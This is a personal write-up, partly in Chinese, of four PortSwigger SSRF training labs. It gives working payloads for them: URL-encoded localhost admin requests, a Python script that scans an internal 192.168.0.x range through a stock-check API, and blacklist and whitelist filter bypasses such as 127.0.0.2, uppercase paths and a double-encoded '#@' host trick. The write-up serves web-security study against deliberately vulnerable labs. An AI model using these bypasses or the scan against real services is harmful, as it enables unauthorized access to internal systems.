# Server-side request forgery (SSRF)

## [Lab: Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 
### 題目解釋
任意發 HTTP GET Request
### 解答

觀察 Stock check 的 API 發現他會去戳
```
http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

改送 
```
http%3a%2f%2flocalhost%2fadmin
```

發現就能看到 admin 介面


再送
```
http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```



## [Lab: Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 

### 題目解釋
SSRF 掃 IP

### 解答

```python
import requests

cookies = {
    'session': 'bakLqRkoOwdV224pxVilyjKiDSlR2Md5',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Waterfox/91.6.0',
    'Accept': '*/*',
    'Accept-Language': 'zh-TW,zh-HK;q=0.8,zh-CN;q=0.7,zh-SG;q=0.5,en-US;q=0.3,en;q=0.2',
    'Referer': 'https://acc01f151fe80e6ec05765910024002e.web-security-academy.net/product?productId=1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://acc01f151fe80e6ec05765910024002e.web-security-academy.net',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'TE': 'trailers',
}

for i in range(1,256):
    data = {
    'stockApi': f'http://192.168.0.{i}:8080/admin'
    }

    response = requests.post('https://acc01f151fe80e6ec05765910024002e.web-security-academy.net/product/stock', headers=headers, cookies=cookies, data=data)
    if response.status_code == 200:
        print("!!!!!!!", i, "Success")
        break
    else:
        print(i, "Fail")
# print(response.status_code)
```

刷到 214 才找到 QQ

```
http://192.168.0.214:8080/admin
```


```
http%3A%2F%2F192.168.0.214%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```


## [Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 

### 題目解釋
繞 localhost， path 可能可以用大小寫來繞

### 解答

直接戳 `http://localhost/` 會噴 

```
"External stock check blocked for security reasons"
```

發現用 `http://127.0.0.2` 就可以ㄌ，但是後面打 `admin` 還是會噴

改用 `http://127.0.0.2/ADMIN` 就可以ㄌ

```
http://127.0.0.2/ADMIN/delete?username=carlos
```

## [Lab: SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass. 
### 題目解釋

### 解答

如果我下 `http://localhost` 他會噴

```
"External stock check host must be stock.weliketoshop.net"
```

可以試著用這樣的想法

```
http://localhost:80#@stock.weliketoshop.net/
```

不過 `#` 需要 Double URL Encode，也就是改寫成 %2523

```
http://localhost:80#@stock.weliketoshop.net/
```

接下來是路徑方面的問題，測試了很久才發現可以加在最後面，加在前面卻不行，但我也不知道為什麼 QQ

```
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username%3dcarlos
```

